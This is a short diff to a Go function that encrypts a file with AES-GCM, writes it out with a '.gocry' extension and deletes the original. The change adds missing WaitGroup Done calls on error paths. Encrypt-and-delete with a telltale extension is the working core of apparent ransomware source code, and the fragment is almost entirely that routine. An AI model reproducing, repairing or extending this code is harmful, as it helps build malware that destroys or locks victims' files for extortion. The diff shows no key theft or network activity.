@@ -18,25 +18,30 @@ import (
 func encryptSingleFile(wg *sync.WaitGroup, path string, key []byte) error {
 	data, err := ioutil.ReadFile(path)
 	if err != nil {
+		wg.Done()
 		return err
 	}
 
 	block, _ := aes.NewCipher(key)
 	gcm, err := cipher.NewGCM(block)
 	if err != nil {
+		wg.Done()
 		return err
 	}
 
 	nonce := make([]byte, gcm.NonceSize())
 	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
+		wg.Done()
 		return err
 	}
 
 	if err := ioutil.WriteFile(path+".gocry", gcm.Seal(nonce, nonce, data, nil), 0666); err != nil {
+		wg.Done()
 		return err
 	}
 
 	if err := os.Remove(path); err != nil {
+		wg.Done()
 		return err
 	}
 
